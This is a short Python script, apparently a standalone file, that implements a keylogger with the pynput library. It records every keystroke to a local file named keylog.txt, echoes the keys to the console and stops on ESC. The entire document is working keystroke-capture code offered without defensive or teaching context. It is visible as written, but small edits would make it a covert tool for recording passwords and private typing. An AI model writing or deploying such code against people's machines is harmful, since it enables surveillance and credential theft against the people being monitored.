from pynput import keyboard

LOG_FILE = "keylog.txt"

# Function to log the key
def log_keystroke(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Error: {e}")

# Function for when a key is pressed
def on_press(key):
    log_keystroke(key)
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

# Function for when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger.")
        return False

# Start the listener
print("🔵 Simple Keylogger Started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

